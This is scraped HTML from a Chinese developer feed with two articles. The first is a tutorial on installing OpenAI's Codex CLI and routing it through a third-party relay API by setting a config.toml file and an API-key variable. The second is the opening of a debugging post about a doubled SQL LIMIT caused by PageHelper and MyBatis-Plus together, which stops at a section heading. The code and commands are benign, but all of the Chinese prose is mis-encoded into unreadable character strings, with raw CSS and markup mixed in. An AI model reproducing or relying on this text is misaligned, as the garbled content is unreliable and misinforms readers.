ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Codex æ˜¯OpenAI æ¨å‡ºçš„ä¸€ç³»åˆ—äººå·¥æ™ºèƒ½ç¼–ç å·¥å…·ï¼Œé€šè¿‡å°†ä»»åŠ¡å§”æ‰˜ç»™å¼ºå¤§çš„äº‘ç«¯å’Œæœ¬åœ°ç¼–ç ä»£ç†ï¼Œå¸®åŠ©å¼€å‘äººå‘˜æå‡å·¥ä½œæ•ˆç‡ã€‚æ”¯æŒåŸç”Ÿç»ˆç«¯ã€vscodeæ’ä»¶ã€cursoræ’ä»¶ç­‰åœºæ™¯ä½¿ç”¨ã€‚</p>
<blockquote>
<p>æœ¬æ•™ç¨‹ç›®çš„ï¼šä½¿ç”¨ç¬¬ä¸‰æ–¹APIï¼ˆä¸­è½¬APIï¼‰æ–¹å¼æ¥å…¥OpenAI CodeXæœåŠ¡ã€‚</p>
</blockquote>
<p>å®˜ç½‘ç½‘ç«™ <a href="https://link.juejin.cn?target=https%3A%2F%2Fopenai.com%2Fcodex%2F" target="_blank" title="https://openai.com/codex/" ref="nofollow noopener noreferrer">openai.com/codex/</a></p>
<h2 data-id="heading-0">ç³»ç»Ÿè¦æ±‚</h2>

























<table><thead><tr><th>ç³»ç»Ÿè¦æ±‚</th><th>ç»†èŠ‚</th></tr></thead><tbody><tr><td>æ“ä½œç³»ç»Ÿ</td><td>macOS 12+ã€Ubuntu 20.04+/Debian 10+ æˆ–é€šè¿‡ WSL2 çš„Windows 11</td></tr><tr><td>Gitï¼ˆå¯é€‰ï¼Œæ¨èï¼‰</td><td>2.23+ å†…ç½® PR åŠ©æ‰‹</td></tr><tr><td>å†…å­˜</td><td>æœ€ä½ 4 GBï¼ˆå»ºè®® 8 GBï¼‰</td></tr><tr><td>Nodeç‰ˆæœ¬</td><td>éœ€è¦Node 22+</td></tr></tbody></table>
<h2 data-id="heading-1">æ­¥éª¤ä¸€ï¼šå®‰è£…Codex CLI</h2>
<p>é€‰æ‹©ä¸€ç§å®‰è£…æ–¹å¼å³å¯ã€‚</p>
<p><strong>npmï¼ˆé€šç”¨ï¼‰</strong></p>
<pre><code class="hljs language-sh" lang="sh">npm i -g @openai/codex

<span class="hljs-comment"># æˆ–åœ¨æœ‰æ—¶éœ€è¦çš„åŸç”ŸåŒ…åï¼š</span>
<span class="hljs-comment"># npm i -g @openai/codex@native</span>

codex --version
</code></pre>
<p><strong>Homebrewï¼ˆmacosç³»ç»Ÿæ¨èï¼‰</strong></p>
<pre><code class="hljs language-sh" lang="sh">brew update
brew install codex
codex --version
</code></pre>
<blockquote>
<p>å¦‚é‡ codex æ— æ³•æ‰§è¡Œæˆ– Node ç‰ˆæœ¬è¿‡æ—§ï¼Œè¯·å‡çº§ Nodeï¼ˆå¸¸è§éœ€è¦ Node 22+ï¼‰ï¼Œæˆ–æ”¹ç”¨ Homebrew å®‰è£…ã€‚</p>
</blockquote>
<h2 data-id="heading-2">Codexé…ç½®</h2>
<blockquote>
<p>å®‰è£…åï¼Œæˆ‘ä»¬å¼€å§‹é…ç½®codexæ‰èƒ½é€šè¿‡apikeyæ–¹å¼æ¥å…¥æˆ‘ä»¬çš„APIã€‚å¦‚æœä½ æ˜¯é€šè¿‡openai plusä¼šå‘˜æ¥ä½¿ç”¨codexï¼Œå¯è·³è¿‡åç»­æ•™ç¨‹ï¼Œcodexä¸­ç›´æ¥ç™»å½•plusè´¦å·å³å¯ä½¿ç”¨ã€‚</p>
</blockquote>
<h3 data-id="heading-3">1.åœ¨ç¬¬ä¸‰æ–¹ä¸­è½¬å¹³å°æ³¨å†Œå¹¶å……å€¼</h3>
<p>è¿™é‡Œæˆ‘ä»¬ä»¥ä¸€ä¸ªç¬¬ä¸‰æ–¹ä¸­è½¬å¹³å°ä½œä¸ºä¾‹å­ï¼Œè¿›å…¥ç½‘ç«™ <a href="https://link.juejin.cn?target=https%3A%2F%2Fapi.v3.cm" target="_blank" title="https://api.v3.cm" ref="nofollow noopener noreferrer">api.v3.cm</a> è¿›è¡Œæ³¨å†Œå¹¶å……å€¼ï¼Œç„¶ååœ¨è¯¥ç½‘ç«™ â€œä»¤ç‰Œç®¡ç†â€é¡µé¢ï¼Œå¤åˆ¶apikeyï¼Œåç»­æˆ‘ä»¬å°†è¯¥apikeyæ¥å…¥åˆ°codexä¸­ä½¿ç”¨ã€‚</p>
<h3 data-id="heading-4">2.codexé…ç½®æ–‡ä»¶config.toml</h3>
<p>Codex å¯åŠ¨æ—¶ä¼šåœ¨<code>~/.codex/</code> è¯»å–<code>config.toml</code>æ–‡ä»¶ã€‚è‹¥ä¸å­˜åœ¨å°±æ–°å»ºï¼š</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">mkdir</span> -p ~/.codex
nano ~/.codex/config.toml
</code></pre>
<p>åœ¨<code>config.toml</code>ä¸­åŠ å…¥å¦‚ä¸‹é…ç½®ï¼Œæ ¹æ®éœ€æ±‚ä¿®æ”¹ï¼š</p>
<pre><code class="hljs language-json" lang="json">model_provider = <span class="hljs-string">"vapi"</span>  # è®¾ç½®APIä¾›åº”å•†
model = <span class="hljs-string">"gpt-5"</span>        # å¡«å†™æ”¯æŒcodexçš„æ¨¡å‹å³å¯
model_reasoning_effort = <span class="hljs-string">"low"</span> # æ€è€ƒçº§åˆ« low mediumï¼ˆé»˜è®¤ï¼‰ high minimalï¼Œä¸éœ€è¦å¯ä»¥#æ³¨é‡Šæ‰

# ä¾›åº”å•†è®¾ç½®
<span class="hljs-punctuation">[</span>model_providers.vapi<span class="hljs-punctuation">]</span>
name = <span class="hljs-string">"VAPI"</span>
base_url = <span class="hljs-string">"https://api.v3.cm/v1"</span>
env_key = <span class="hljs-string">"V_API_KEY"</span>    # ä¿ç•™è¿™ä¸ªå€¼ï¼Œä¸éœ€è¦æ›¿æ¢ä¸ºapikey
wire_api = <span class="hljs-string">"chat"</span> # ä½¿ç”¨ /v1/chat/completions åè®®
query_params = <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span>
request_max_retries = <span class="hljs-number">4</span>            # å¤±è´¥æœ€å¤§é‡è¯•æ¬¡æ•°
stream_max_retries = <span class="hljs-number">10</span>            # æµä¸­æ–­åæœ€å¤§é‡è¯•æ¬¡æ•°

# å¯é€‰ï¼šå®šä¹‰ä¸€ä¸ª profileï¼Œä¾¿äºå‘½ä»¤è¡Œå¿«é€Ÿåˆ‡æ¢
<span class="hljs-punctuation">[</span>profiles.vapi<span class="hljs-punctuation">]</span>
model_provider = <span class="hljs-string">"vapi"</span>
model = <span class="hljs-string">"gpt-5"</span>
approval_policy = <span class="hljs-string">"on-request"</span>      # éœ€è¦æ—¶å†è¯¢é—®æ˜¯å¦æ‰§è¡Œ
sandbox_mode = <span class="hljs-string">"workspace-write"</span>    # å…è®¸åœ¨å½“å‰å·¥ç¨‹å†™æ–‡ä»¶ï¼Œä¾æ—§ç¦ç½‘

</code></pre>
<h3 data-id="heading-5">3.æ·»åŠ apikeyç¯å¢ƒå˜é‡</h3>
<p>è¿™æ­¥å¾ˆé‡è¦ï¼Œæˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬è®¾ç½®çš„ç¯å¢ƒå˜é‡<code>V_API_KEY</code>æ·»åŠ åˆ°ç³»ç»Ÿé…ç½®ä¸­ã€‚</p>
<blockquote>
<p>keyå€¼å°±æ˜¯æˆ‘ä»¬ä»ä¸­è½¬ç½‘ç«™çš„ â€œä»¤ç‰Œç®¡ç†â€é¡µé¢å¤åˆ¶çš„sk-å¼€å¤´çš„apikeyã€‚</p>
</blockquote>
<h4 data-id="heading-6">Windowç”¨æˆ·è®¾ç½®apikeyç¯å¢ƒå˜é‡ï¼š</h4>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># æ°¸ä¹…è®¾ç½®ï¼ˆæ¨èï¼‰</span>
setx V_API_KEY <span class="hljs-string">"sk-xxxxxx"</span>

<span class="hljs-comment"># ä¸´æ—¶è®¾ç½®ï¼Œåˆ‡æ¢çª—å£åå¤±æ•ˆ</span>
<span class="hljs-built_in">set</span> V_API_KEY=sk-xxxxxx
</code></pre>
<h4 data-id="heading-7">Mac/Linuxç”¨æˆ·è®¾ç½®ç¯å¢ƒå˜é‡ï¼š</h4>
<p><strong>æ–¹æ³•ä¸€ï¼šæ°¸ä¹…è®¾ç½®ï¼ˆæ¨è)</strong></p>
<p>1.ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼ˆæˆ–ç›´æ¥æ‰‹åŠ¨æ‰“å¼€æ–‡ä»¶ï¼‰</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># å¦‚æœä½¿ç”¨ bash</span>
nano ~/.bash_profile
<span class="hljs-comment"># æˆ–</span>
nano ~/.bashrc

<span class="hljs-comment"># å¦‚æœä½¿ç”¨ zshï¼ˆMacé»˜è®¤ï¼‰</span>
nano ~/.zshrc
</code></pre>
<p>2.åœ¨æœ€åæ–°è¡Œï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">export</span> V_API_KEY=<span class="hljs-string">"sk-xxxxxx"</span>
</code></pre>
<p>3.ä¿å­˜å¹¶ç”Ÿæ•ˆ</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># bash</span>
<span class="hljs-built_in">source</span> ~/.bash_profile

<span class="hljs-comment"># zsh</span>
<span class="hljs-built_in">source</span> ~/.zshrc

</code></pre>
<p><strong>æ–¹æ³•äºŒï¼šä¸´æ—¶è®¾ç½®</strong></p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">export</span> V_API_KEY=<span class="hljs-string">"sk-xxxxxx"</span>
</code></pre>
<h4 data-id="heading-8">éªŒè¯æ˜¯å¦è®¾ç½®æˆåŠŸ</h4>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># Windows (CMD)</span>
<span class="hljs-built_in">echo</span> %V_API_KEY%

<span class="hljs-comment"># Windows (PowerShell)</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$env</span>:V_API_KEY

<span class="hljs-comment"># Mac/Linux</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$V_API_KEY</span>
</code></pre>
<p>å¦‚æœæ˜¾ç¤º<code>sk-xxxxxx</code>åˆ™è¯´æ˜è®¾ç½®æˆåŠŸï¼</p>
<h2 data-id="heading-9">å¯åŠ¨å‘½ä»¤</h2>
<h3 data-id="heading-10">Codex CLIåŸç”Ÿå‘½ä»¤</h3>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># ç›´æ¥æé—®</span>
codex <span class="hljs-string">"ä½ å¥½"</span>

<span class="hljs-comment"># é€‰æ‹©æä¾›å•†å¹¶æé—®(å¦‚æœæœ‰å¤šä¸ªæä¾›å•†çš„è¯)</span>
codex --profile vapi <span class="hljs-string">"ä½ å¥½"</span>
</code></pre>
<h3 data-id="heading-11">vscodeä¸­ä½¿ç”¨Codexæ’ä»¶</h3>
<p>å¦‚æœæ˜¯åœ¨vscodeä¸­ä½¿ç”¨codexæ’ä»¶ï¼Œæˆ‘ä»¬é…ç½®å¥½åéœ€è¦å®Œå…¨é€€å‡ºvscodeé‡æ–°å¯åŠ¨æ‰èƒ½ç”Ÿæ•ˆã€‚</p>
<h2 data-id="heading-12">Codexé«˜çº§ä½¿ç”¨æŠ€å·§æŒ‡å—</h2>
<h3 data-id="heading-13">CLI å‚è€ƒ</h3>

























<table><thead><tr><th>å‘½ä»¤</th><th>ç›®çš„</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>codex</td><td>äº¤äº’å¼TUI</td><td>codex</td></tr><tr><td>codex "..."</td><td>äº¤äº’å¼ TUI çš„åˆå§‹æç¤º</td><td>codex "fix lint errors"</td></tr><tr><td>codex exec "..."</td><td>éäº¤äº’å¼"è‡ªåŠ¨åŒ–æ¨¡å¼"</td><td>codex exec "explain utils.ts"</td></tr></tbody></table>
<h3 data-id="heading-14">éäº¤äº’/CIæ¨¡å¼</h3>
<p>åœ¨ç®¡é“ä¸­ä»¥æ— å¤´æ–¹å¼è¿è¡Œ Codexã€‚ç¤ºä¾‹ GitHub Action æ­¥éª¤ï¼š</p>
<pre><code class="hljs language-sh" lang="sh">- name: Update changelog via Codex
  run: |
    npm install -g @openai/codex
    <span class="hljs-built_in">export</span> OPENAI_API_KEY=<span class="hljs-string">"<span class="hljs-variable">${{ secrets.OPENAI_KEY }</span>}"</span>
    codex <span class="hljs-built_in">exec</span> --full-auto <span class="hljs-string">"update CHANGELOG for next release"</span>
</code></pre>
<h3 data-id="heading-15">æ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼ˆMCPï¼‰</h3>
<p>é€šè¿‡åœ¨<code>~/.codex/config.toml</code>ä¸­å®šä¹‰ä¸€ä¸ª<code>mcp_servers</code>éƒ¨åˆ†ï¼Œå¯ä»¥å°† Codex CLI é…ç½®ä¸ºä½¿ç”¨ MCP æœåŠ¡å™¨ã€‚å®ƒæ—¨åœ¨åæ˜  Claude å’Œ Cursor ç­‰å·¥å…·åœ¨å…¶å„è‡ªçš„ JSON é…ç½®æ–‡ä»¶ä¸­çš„ mcpServers å®šä¹‰æ–¹å¼ï¼Œå°½ç®¡ Codex çš„æ ¼å¼ç•¥æœ‰ä¸åŒï¼Œå› ä¸ºå®ƒä½¿ç”¨çš„æ˜¯ TOML è€Œä¸æ˜¯ JSONï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment"># IMPORTANT: the top-level key is `mcp_servers` rather than `mcpServers`.</span>
[mcp_servers.server-name]
<span class="hljs-built_in">command</span> = <span class="hljs-string">"npx"</span>
args = [<span class="hljs-string">"-y"</span>, <span class="hljs-string">"mcp-server"</span>]
<span class="hljs-built_in">env</span> = { <span class="hljs-string">"API_KEY"</span> = <span class="hljs-string">"value"</span> }
</code></pre>
<h2 data-id="heading-16">å‚è€ƒèµ„æ–™</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenai%2Fcodex%2Fblob%2Fmain%2Fdocs%2Fconfig.md%23config" target="_blank" title="https://github.com/openai/codex/blob/main/docs/config.md#config" ref="nofollow noopener noreferrer">Codexå®˜æ–¹è¯¦ç»†é…ç½®è¯´æ˜æ–‡æ¡£</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[PageHelper é˜²å‘æŒ‡å—ï¼šä»å…œåº•æ–¹æ¡ˆåˆ°æ ¹æ²»æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7577171133444571172</link>    <guid>https://juejin.cn/post/7577171133444571172</guid>    <pubDate>2025-11-27T07:02:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577171133444571172" data-draft-id="7577042851080011819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PageHelper é˜²å‘æŒ‡å—ï¼šä»å…œåº•æ–¹æ¡ˆåˆ°æ ¹æ²»æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="åç«¯,Spring Boot"/> <meta itemprop="datePublished" content="2025-11-27T07:02:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¸æµªæ— ç—•"/> <meta itemprop="url" content="https://juejin.cn/user/2834988091055719"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PageHelper é˜²å‘æŒ‡å—ï¼šä»å…œåº•æ–¹æ¡ˆåˆ°æ ¹æ²»æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2834988091055719/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¸æµªæ— ç—•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:02:50.000Z" title="Thu Nov 27 2025 07:02:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">PageHelper é˜²å‘æŒ‡å—ï¼šä»å…œåº•æ–¹æ¡ˆåˆ°æ ¹æ²»æ–¹æ¡ˆ</h2>
<p>å‰å‡ å¤©çº¿ä¸ŠæŠ¥äº†ä¸ªå¥‡æ€ªçš„é”™ï¼ŒSQL é‡Œå‡ºç°äº†ä¸¤ä¸ª LIMITã€‚å½“æ—¶çœ‹åˆ°æ—¥å¿—æˆ‘æ•´ä¸ªäººéƒ½æ‡µäº†ï¼Œå¿ƒæƒ³è¿™ä»€ä¹ˆé¬¼ï¼Œè°èƒ½å†™å‡ºè¿™ç§ SQLï¼Ÿ</p>
<p>åæ¥ä¸€é¡¿æ’æŸ¥ï¼Œå‘ç°æ˜¯ PageHelper å’Œ MyBatis-Plus çš„åˆ†é¡µ"æ‰“æ¶"äº†ã€‚æ›´å‘çš„æ˜¯ï¼Œè¿™é—®é¢˜è—äº†å¥½å‡ ä¸ªæœˆæ‰æš´éœ²å‡ºæ¥ã€‚</p>
<p>ä»Šå¤©å°±æ¥èŠèŠè¿™ä¸ªå‘ï¼Œä»¥åŠæˆ‘ä»¬åæ¥æ˜¯æ€ä¹ˆé˜²èŒƒçš„ã€‚</p>
<h3 data-id="heading-1">å…ˆçœ‹çœ‹å½“æ—¶çš„æŠ¥é”™</h3>
<p>é‚£å¤©ä¸‹åˆï¼Œå‘Šè­¦ç¾¤çªç„¶å¼¹äº†æ¡æ¶ˆæ¯ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-18</span> <span class="hljs-number">14</span>:<span class="hljs-number">32</span>:<span class="hljs-number">17.892</span> ERROR [http<span class="hljs-operator">-</span>nio<span class="hljs-number">-8080</span><span class="hljs-operator">-</span><span class="hljs-keyword">exec</span><span class="hljs-number">-23</span>] c.x.common.exception.GlobalExceptionHandler <span class="hljs-operator">-</span> <span class="hljs-keyword">SQL</span>æ‰§è¡Œå¼‚å¸¸
org.springframework.jdbc.BadSqlGrammarException: 
### Error querying database. Cause: java.sql.SQLSyntaxErrorException: 
You have an error <span class="hljs-keyword">in</span> your <span class="hljs-keyword">SQL</span> syntax; <span class="hljs-keyword">check</span> the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the <span class="hljs-keyword">right</span> syntax <span class="hljs-keyword">to</span> use near <span class="hljs-string">'LIMIT 10 LIMIT 10'</span> <span class="hljs-keyword">at</span> line <span class="hljs-number">1</span>
### <span class="hljs-keyword">SQL</span>: <span class="hljs-keyword">SELECT</span> id, order_no, user_id, amount, status, create_time <span class="hljs-keyword">FROM</span> t_order <span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">=</span> ? LIMIT <span class="hljs-number">10</span> LIMIT <span class="hljs-number">10</span>
</code></pre>
<p><code>LIMIT 10 LIMIT 10</code>ï¼Œä¸¤ä¸ª LIMIT æŒ¨åœ¨ä¸€èµ·ï¼ŒSQL ç›´æ¥ç‚¸äº†ã€‚</p>
<p>æˆ‘ç¬¬ä¸€ååº”æ˜¯ï¼Œè°è¿™ä¹ˆè™ï¼Œæ‰‹å†™ SQL å†™äº†ä¿© LIMITï¼Ÿä½†è½¬å¿µä¸€æƒ³ä¸å¯¹ï¼Œæˆ‘ä»¬çš„ SQL éƒ½æ˜¯ MyBatis ç”Ÿæˆçš„ï¼Œä¸å¯èƒ½æœ‰è¿™ç§ä½çº§é”™è¯¯ã€‚</p>
<h3 data-id="heading-2">é¡ºç€ä»£ç æ‰’ä¸‹å»</h3>
<p>æ ¹æ®å †æ ˆä¿¡æ¯æ‰¾åˆ°äº†å¯¹åº”çš„ Mapperï¼Œä»£ç é•¿è¿™æ ·ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// OrderServiceImpl.java</span>
<span class="hljs-keyword">public</span> IPage&lt;Order&gt; <span class="hljs-title function_">queryOrderList</span><span class="hljs-params">(OrderQueryDTO dto)</span> {
    PageHelper.startPage(dto.getPageNum(), dto.getPageSize());
    
    Page&lt;Order&gt; page = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>&lt;&gt;(dto.getPageNum(), dto.getPageSize());
    <span class="hljs-keyword">return</span> orderMapper.selectPage(page, buildQueryWrapper(dto));
}
</code></pre>
<p>çœ‹åˆ°è¿™æˆ‘å°±æ˜ç™½äº†ã€‚</p>
<p>è¿™æ®µä»£ç é‡ŒåŒæ—¶ç”¨äº†ä¸¤ç§åˆ†é¡µæ–¹æ¡ˆï¼šä¸Šé¢æ˜¯ PageHelper çš„ <code>startPage()</code>ï¼Œä¸‹é¢æ˜¯ MyBatis-Plus çš„ <code>IPage</code>ã€‚ä¸¤è¾¹éƒ½ä¼šå¾€ SQL é‡Œæ‹¼ LIMITï¼Œæ‰€ä»¥å‡ºç°äº†ä¸¤ä¸ªã€‚</p>
<p>ä½†é—®é¢˜æ˜¯ï¼Œè¿™ä»£ç æ˜¯è°å†™çš„ï¼Ÿä»€ä¹ˆæ—¶å€™å†™çš„ï¼Ÿ</p>
<p>ç¿»äº†ä¸€ä¸‹ git è®°å½•ï¼ŒçœŸç›¸æµ®å‡ºæ°´é¢äº†ã€‚</p>
<h3 data-id="heading-3">å†å²çš„é”…</h3>
<p>åŸæ¥æˆ‘ä»¬é¡¹ç›®ä¹‹å‰å…¨éƒ¨ç”¨çš„ PageHelperï¼Œåæ¥æŠ€æœ¯æ ˆç»Ÿä¸€ï¼Œè¦æ±‚è¿ç§»åˆ° MyBatis-Plusã€‚è¿™ä¸ªæ¥å£æ˜¯ä¸‰ä¸ªæœˆå‰æ”¹çš„ï¼Œå¼€å‘åŒå­¦æŠŠåˆ†é¡µé€»è¾‘æ”¹æˆäº† IPageï¼Œä½†æ˜¯å¿˜äº†æŠŠä¸Šé¢é‚£è¡Œ <code>PageHelper.startPage()</code> åˆ æ‰ã€‚</p>
<p>æœ€éªšçš„æ˜¯ï¼Œè¿™ bug è—äº†ä¸‰ä¸ªæœˆæ‰çˆ†å‡ºæ¥ã€‚ä¸ºä»€ä¹ˆèƒ½è—è¿™ä¹ˆä¹…ï¼Ÿè¿™å°±è¦è¯´è¯´ ThreadLocal çš„å¤šå±‚é˜²æŠ¤æœºåˆ¶äº†ã€‚</p>
<h3 data-id="heading-4">ä¸ºä»€ä¹ˆè¿™ä¸ª bug è¿™ä¹ˆéš¾æš´éœ²</h3>
